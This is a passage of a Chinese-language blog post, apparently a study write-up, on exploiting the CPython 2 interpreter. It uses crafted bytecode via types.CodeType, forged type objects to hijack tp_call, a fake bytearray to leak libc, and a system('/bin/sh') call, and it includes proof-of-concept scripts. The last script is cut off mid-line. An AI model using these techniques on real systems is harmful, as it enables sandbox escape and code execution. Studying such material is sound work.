就是等价于</span><br><span class="line">              <span class="number">7</span> RETURN_VALUE</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里我没有想到, 原来加的字节码这么简单??? 或者说, 这里的运算都是以对象的形式进行的, 然后具体的实现在不同的对象中? 结合前面的源码, 我觉得很有可能=.= </p>
+<p>其中<code>TOS: top-of-stack</code>, STORE开头的指令我觉得可以理解为pop, LOAD开头的指令我觉得可以理解为push, 因为Python是基于栈的虚拟机, 所以所有的操作都是要依靠栈来实现, 比如一个BINARY_ADD, 就是等价于<code>TOS = TOS1 + TOS</code>, 翻译成人话就是栈顶元素和第二个元素加起来, 放到栈顶, 这里在给个例子</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">a1</span><span class="params">()</span>:</span>                                     </span><br><span class="line"><span class="meta">... </span>    a2()                                      </span><br><span class="line"><span class="meta">... </span>                                              </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">a2</span><span class="params">()</span>:</span>                                     </span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> <span class="number">1</span>                                  </span><br><span class="line"><span class="meta">... </span>                                              </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dis.dis(a1)                                   </span><br><span class="line">  <span class="number">2</span>           <span class="number">0</span> LOAD_GLOBAL              <span class="number">0</span> (a2)   </span><br><span class="line">              <span class="number">3</span> CALL_FUNCTION            <span class="number">0</span>        </span><br><span class="line">              <span class="number">6</span> POP_TOP                           </span><br><span class="line">              <span class="number">7</span> LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>) </span><br><span class="line">             <span class="number">10</span> RETURN_VALUE                      </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dis.dis(a2)                                   </span><br><span class="line">  <span class="number">2</span>           <span class="number">0</span> LOAD_CONST               <span class="number">1</span> (<span class="number">1</span>)    </span><br><span class="line">              <span class="number">3</span> RETURN_VALUE                      </span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个地方就很明了了, 函数的调用都要先把调用函数的地址load进栈, 返回的时候使用的是<code>RETURN_VALUE</code> 可以看出, 和x86的不同是它的返回地址是没有在字节码中处理的, 也就是说, 它的调用堆栈和存放值的值堆栈是分离的. 这个也是Python虚拟机的特点之一. 有三种不同的堆栈, 调用堆栈(函数调用?)\块堆栈(用于处理 循环 try_except等语句块)\值堆栈(load/store?)</p>
+<p>还有一点, 我们可以观察出来, python字节码一般是3个byte一个指令, 第一个byte是opcode, 后面的是数据, 假如需要拓展数据域, 那么需要<code>EXTENDED_ARG</code>这个指令来完成</p>
+<h6 id="types-CodeType"><a href="#types-CodeType" class="headerlink" title="types.CodeType"></a>types.CodeType</h6><p>我们还能用<code>object.__code__.co_code</code>这样的形式来直接读bytecode, 或者同理来访问其他的变量, 但是这个只是一个只读的变量, 所以写仍然需要types来操作</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">types.CodeType(</span><br><span class="line">	argcount, nlocals, <span class="comment"># 位置参数个数, 局部变量个数</span></span><br><span class="line">	stacksize, flags,  <span class="comment"># 栈大小, unk</span></span><br><span class="line">	codestring, constants, <span class="comment"># 字节码指令序列, 常量集合</span></span><br><span class="line">	names, varnames, <span class="comment"># 所有符号名称集合, 局部变量名称集合</span></span><br><span class="line">	filename, name, <span class="comment"># 代码所在文件名, 模块名|函数名|类名</span></span><br><span class="line">	firstlineno, <span class="comment"># 代码块在文件中的起始行号</span></span><br><span class="line">	lnotab[, freevars[,cellvars]] <span class="comment"># 字节码指令和行号对应关系[, 闭包用变量名集合[, 内部嵌套函数引用变量名集合]]</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>其他的地方对于我们来说不那么重要, 对于我们来说, 最重要的是co_code和co_consts,<br>有了这两个我们就很方便了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">somefunc</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_fake_func</span><span class="params">(somefunc,co_code,co_consts)</span>:</span></span><br><span class="line">	<span class="comment"># co_code: 字节码</span></span><br><span class="line">	<span class="comment"># co_consts: 一些常量</span></span><br><span class="line">	somefunc.func_code = types.CodeType(</span><br><span class="line">		<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">		co_code,co_consts,</span><br><span class="line">		(),(),<span class="string">""</span>,<span class="string">""</span>,<span class="number">0</span>,<span class="string">""</span></span><br><span class="line">	)</span><br><span class="line">	<span class="keyword">return</span> somefunc</span><br></pre></td></tr></table></figure>
+
+<p>在这个函数中, somefunc仅仅是一个给我们构造的工具函数而已, 没有人权的(x). </p>
+<p>调用完get_fake_func之后直接执行返回的somefunc就能运行我们的bytecode</p>
+<h5 id="任意字节码执行"><a href="#任意字节码执行" class="headerlink" title="任意字节码执行"></a>任意字节码执行</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># poc.py</span></span><br><span class="line"><span class="keyword">from</span> opcode <span class="keyword">import</span> opmap</span><br><span class="line"><span class="keyword">import</span> types</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">code_object</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">code_object.func_code=types.CodeType(</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">    chr(opmap[<span class="string">'LOAD_CONST'</span>])+<span class="string">'\xef\xbe'</span>,</span><br><span class="line">        (),(),(),<span class="string">""</span>,<span class="string">""</span>,<span class="number">0</span>,<span class="string">""</span></span><br><span class="line">)</span><br><span class="line">code_object()</span><br></pre></td></tr></table></figure>
+
+<p>运行后我们发现, 程序crash掉了</p>
+<p>gdb 打开调试一下, 康康挂在哪里</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">1237</span> </span><br><span class="line">  <span class="number">1238</span>         TARGET(LOAD_CONST)</span><br><span class="line">  <span class="number">1239</span>         &#123;</span><br><span class="line">  <span class="number">1240</span>             x = GETITEM(consts, oparg);</span><br><span class="line">  <span class="number">1241</span>             Py_INCREF(x);</span><br><span class="line">► <span class="number">1242</span>             PUSH(x);</span><br><span class="line">  <span class="number">1243</span>             FAST_DISPATCH();</span><br><span class="line">  <span class="number">1244</span>         &#125;</span><br><span class="line">  <span class="number">1245</span> </span><br><span class="line">  <span class="number">1246</span>         PREDICTED_WITH_ARG(STORE_FAST);</span><br><span class="line">  <span class="number">1247</span>         TARGET(STORE_FAST)</span><br></pre></td></tr></table></figure>
+
+<p>我们查看一下oparg的值可以发现, 我们控制了oparg的值为0xdead, 因为访问到一个不能访问的对象, 所以导致程序crash掉了.</p>
+<p>到这里我们就已经可以控制运行的字节码了, 接下来, 继续学习怎么从任意字节码执行到getshell</p>
+<h4 id="从执行任意字节码到任意代码执行"><a href="#从执行任意字节码到任意代码执行" class="headerlink" title="从执行任意字节码到任意代码执行"></a>从执行任意字节码到任意代码执行</h4><h5 id="劫持程序执行流"><a href="#劫持程序执行流" class="headerlink" title="劫持程序执行流"></a>劫持程序执行流</h5><p>现在可以执行任意字节码了, 但是还是不够, 我们需要一个函数指针, 假如能改掉这个函数指针, 那么我们就可以控制程序执行流了</p>
+<p>确实非常幸运, 恰巧有这么一个函数指针:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Object/abstract.c</span><br><span class="line"></span><br><span class="line">PyObject *</span><br><span class="line">PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw)</span><br><span class="line">&#123;</span><br><span class="line">    ternaryfunc call;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((call = func-&gt;ob_type-&gt;tp_call) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        PyObject *result;</span><br><span class="line">        <span class="keyword">if</span> (Py_EnterRecursiveCall(<span class="string">" while calling a Python object"</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">		<span class="comment">// 就在这, 很有意思的函数指针, 注意这个func是之后指向我们伪造fake_obj的指针</span></span><br><span class="line">        result = (*call)(func, arg, kw); </span><br><span class="line">        Py_LeaveRecursiveCall();</span><br><span class="line">        <span class="keyword">if</span> (result == <span class="literal">NULL</span> &amp;&amp; !PyErr_Occurred())</span><br><span class="line">            PyErr_SetString(</span><br><span class="line">                PyExc_SystemError,</span><br><span class="line">                <span class="string">"NULL result without error in PyObject_Call"</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    PyErr_Format(PyExc_TypeError, <span class="string">"'%.200s' object is not callable"</span>,</span><br><span class="line">                 func-&gt;ob_type-&gt;tp_name);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如何调用到这个函数指针:</p>
+<p>Object/ceval.c 中字节码为<code>CALL_FUNCTION</code>时,<br>–&gt; call_function()<br>–&gt; do_call()<br>–&gt; PyObject_Call()<br>–&gt; 目标函数指针</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// Object/ceval.c</span></span><br><span class="line">        TARGET(CALL_FUNCTION)</span><br><span class="line">        &#123;</span><br><span class="line">            PyObject **sp;</span><br><span class="line">            PCALL(PCALL_ALL);</span><br><span class="line">            sp = stack_pointer;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WITH_TSC</span></span><br><span class="line">            x = call_function(&amp;sp, oparg, &amp;intr0, &amp;intr1);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">            x = call_function(&amp;sp, oparg);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            stack_pointer = sp;</span><br><span class="line">            PUSH(x);</span><br><span class="line">            <span class="keyword">if</span> (x != <span class="literal">NULL</span>) DISPATCH();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> PyObject *</span><br><span class="line">call_function(PyObject ***pp_stack, <span class="keyword">int</span> oparg</span><br><span class="line">#ifdef WITH_TSC</span><br><span class="line">                , uint64* pintr0, uint64* pintr1</span><br><span class="line">#endif</span><br><span class="line">                )</span><br><span class="line">&#123;</span><br><span class="line">	[...]</span><br><span class="line">        <span class="keyword">if</span> (PyFunction_Check(func))</span><br><span class="line">            x = fast_function(func, pp_stack, n, na, nk);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            x = do_call(func, pp_stack, na, nk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> PyObject *</span><br><span class="line">do_call(PyObject *func, PyObject ***pp_stack, <span class="keyword">int</span> na, <span class="keyword">int</span> nk)</span><br><span class="line">&#123;</span><br><span class="line">[...]</span><br><span class="line">    <span class="keyword">if</span> (PyCFunction_Check(func)) &#123;</span><br><span class="line">        PyThreadState *tstate = PyThreadState_GET();</span><br><span class="line">        C_TRACE(result, PyCFunction_Call(func, callargs, kwdict));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        result = PyObject_Call(func, callargs, kwdict);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>总结一下, 如何调用到函数指针</p>
+<blockquote>
+<p>i. 字节码类型为 CALL_FUNCTION, 进入call_function<br>ii. ob_type != PyCFunction_Type 或者 (oparg&gt;&gt;8) &amp; 0xff &lt; 0<br>(师傅说这个地方还不能是PyMethod_Type, 这个源码上看的不太懂, 感觉这个无所谓)<br>iii. ob_type != PyFunction_Type, 进入do_call<br>iv. ob_type != PyCFunction_Type 进入PyObject_Call<br>v. func-&gt;ob_type-&gt;tp_call 为我们调用的函数指针</p>
+</blockquote>
+<p>最终思路:</p>
+<ol>
+<li>用PyStringObject伪造PyTypeObject</li>
+<li>伪造PyObject, 让他的type指向前面伪造的PyTypeObject</li>
+<li>第三个Object存放指向fake_PyObject的指针 </li>
+<li>计算offset, 用<code>EXTENDED_ARG</code>拓展寄存器, <code>LOAD_CONST</code>将fake_PyObject压入数据栈, 调用CALL_FUNCTION劫持程序流</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># poc.py 将控制程序流到0xdeadbeef</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> opcode <span class="keyword">import</span> opmap</span><br><span class="line"><span class="keyword">import</span> types,struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">code_object</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print("[*] info code_object: "+hex(id(code_object)))</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code</span><span class="params">(co_code,co_consts)</span>:</span></span><br><span class="line">    code_object.func_code=types.CodeType(</span><br><span class="line">        <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">        co_code,</span><br><span class="line">        co_consts,(),(),<span class="string">""</span>,<span class="string">""</span>,<span class="number">0</span>,<span class="string">""</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> code_object</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_opcode</span><span class="params">(opname)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> chr(opmap[opname])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p16</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"&lt;H"</span>, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p32</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p64</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"&lt;Q"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># jump to deadbeef ==&gt; fake PyTypeObject</span></span><br><span class="line">fake_type=<span class="number">0x5c</span>*<span class="string">"a"</span>+p64(<span class="number">0xdeadbeef</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里是伪造了一个fake_obj</span></span><br><span class="line">fake_obj=<span class="string">"a"</span>*<span class="number">4</span>+p64(id(fake_type))*<span class="number">2</span>+p64(<span class="number">1</span>)+p64(id(fake_type)) <span class="comment">#padding+prev+next+ref+type</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake_obj_ptr 的头指针</span></span><br><span class="line">fake_obj_ptr=id(fake_obj)+<span class="number">0x38</span></span><br><span class="line">print(<span class="string">"[*] info fake_obj_beg: "</span>+hex(fake_obj_ptr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个load用来存储fake_obj_ptr的地址，因为在python中万物皆对象，</span></span><br><span class="line"><span class="comment"># 在字节码的栈中进行load操作，</span></span><br><span class="line"><span class="comment"># 寻址的时候是用指向fake_obj对象的指针减去const中的第一个指针所在的地址来计算偏移的</span></span><br><span class="line">to_load=<span class="string">"aaaa"</span>+p64(fake_obj_ptr)</span><br><span class="line">to_load_ptr=id(to_load)+<span class="number">0x38</span></span><br><span class="line">print(<span class="string">"[+] to_load_ptr: "</span>+hex(to_load_ptr))</span><br><span class="line"></span><br><span class="line">const=(<span class="string">"aaaaaa"</span>,)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add 0x28 to get first obj's address in const</span></span><br><span class="line">const_ptr=id(const)+<span class="number">0x28</span></span><br><span class="line">print(<span class="string">"[*] info const_ptr: "</span>+hex(const_ptr))</span><br><span class="line"></span><br><span class="line">offset=((to_load_ptr-const_ptr)/<span class="number">8</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">print(<span class="string">"[+] Success offset: "</span>+hex(offset))</span><br><span class="line"></span><br><span class="line">extended_arg = get_opcode(<span class="string">'EXTENDED_ARG'</span>)</span><br><span class="line">load_const = get_opcode(<span class="string">'LOAD_CONST'</span>)</span><br><span class="line">call_function = get_opcode(<span class="string">'CALL_FUNCTION'</span>)</span><br><span class="line">load_fast = get_opcode(<span class="string">'LOAD_FAST'</span>)</span><br><span class="line">return_value = get_opcode(<span class="string">'RETURN_VALUE'</span>)</span><br><span class="line"></span><br><span class="line">code=get_code(</span><br><span class="line">    <span class="comment"># 这里使用extended_arg来将寄存器拓展到4个byte</span></span><br><span class="line">    extended_arg+</span><br><span class="line">    p16(offset &gt;&gt; <span class="number">16</span>)+</span><br><span class="line">    <span class="comment"># load_const将偏移处的指针的对象加载进数据栈，也就是fake_obj</span></span><br><span class="line">    load_const+</span><br><span class="line">    p16(offset&amp;<span class="number">0xffff</span>)+</span><br><span class="line">    <span class="comment"># 此时TOS为fake_obj，直接调用call_function调用我们前面伪造的函数指针</span></span><br><span class="line">    call_function+</span><br><span class="line">    p16(<span class="number">0</span>),</span><br><span class="line">    const</span><br><span class="line">)</span><br><span class="line">code()</span><br></pre></td></tr></table></figure>
+
+<p>至此, 我们就成功控制了程序执行流. 接下来想要getshell我们还需要leak出一些信息</p>
+<h5 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h5><p>任意地址读选择的是<code>PyByteArrayObject</code>这个对象, 可以看到, 这个对象的ob_bytes直接指向内存, 而且这是一个可读的内存. 所以操作起来这个对象十分的方便</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Object layout */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PyObject_VAR_HEAD</span><br><span class="line">    <span class="comment">/* XXX(nnorwitz): should ob_exports be Py_ssize_t? */</span></span><br><span class="line">    <span class="keyword">int</span> ob_exports; <span class="comment">/* how many buffer exports */</span></span><br><span class="line">    Py_ssize_t ob_alloc; <span class="comment">/* How many bytes allocated */</span></span><br><span class="line">    <span class="keyword">char</span> *ob_bytes; <span class="comment">//这是一个可读的内存!</span></span><br><span class="line">&#125; PyByteArrayObject;</span><br></pre></td></tr></table></figure>
+
+<p>和上面劫持控制流的方法类似, 我们只需要用str伪造一个PyBytearrayObject, 然后写入字节码的办法来将这个Object合法化, 然后返回这个对象给我们正常使用, 那么就能够用来实现leak.</p>
+<p>想要将object合法化, 我们需要有一个PyBytearrayObject的Type, 这个Type的地址可以使用Bytearray对象的<code>__subclasshook__</code>方法来获取. 类似于这样<code>obj.__subclasshook__.__str__().split(&quot;at &quot;)[1][:-1]</code></p>
+<p>至于libc中地址的存储位置, 用的是<code>id(sys.stdin)+0x20</code>的位置, 这个位置有一个libc的地址, 那么我们将它leak出来就行</p>
+<p>方法是将这个地址写入伪造的PyBytearrayObject的ob_bytes域, 然后我们就能通过 <code>u64(str(fake_Bytearray_obj).ljust(8,&#39;\x00&#39;))[0]</code>将libc成功leak出来</p>
+<h5 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h5><p>前面已经提到过, 在劫持函数指针后进行函数调用的时候, 第一个参数是指向 fake_obj 开头的指针, 那么, 我们将伪造的fake_obj的前几个字节改为”/bin/sh\x00”即可getshell了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> opcode <span class="keyword">import</span> opmap</span><br><span class="line"><span class="keyword">import</span> types,struct,sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">code_object</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code</span><span class="params">(co_code,co_consts)</span>:</span></span><br><span class="line">    code_object.func_code=types.CodeType(</span><br><span class="line">        <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">        co_code,</span><br><span class="line">        co_consts,(),(),<span class="string">""</span>,<span class="string">""</span>,<span class="number">0</span>,<span class="string">""</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> code_object</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_opcode</span><span class="params">(opname)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> chr(opmap[opname])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p16</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"&lt;H"</span>, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p32</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p64</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"&lt;Q"</span>, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u64</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">"&lt;Q"</span>, content)</span><br><span class="line"></span><br><span class="line">extended_arg = get_opcode(<span class="string">'EXTENDED_ARG'</span>)</span><br><span class="line">load_const = get_opcode(<span class="string">'LOAD_CONST'</span>)</span><br><span class="line">call_function = get_opcode(<span class="string">'CALL_FUNCTION'</span>)</span><br><span class="line">load_fast = get_opcode(<span class="string">'LOAD_FAST'</span>)</span><br><span class="line">return_value = get_opcode(<span class="string">'RETURN_VALUE'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">system</span><span class="params">(system_addr)</span>:</span></span><br><span class="line">    <span class="comment"># jump to deadbeef ==&gt; fake PyTypeObject</span></span><br><span class="line">    fake_type=<span class="number">0x5c</span>*<span class="string">"a"</span>+p64(system_addr) </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 这里是伪造了一个fake_obj</span></span><br><span class="line">    fake_obj=<span 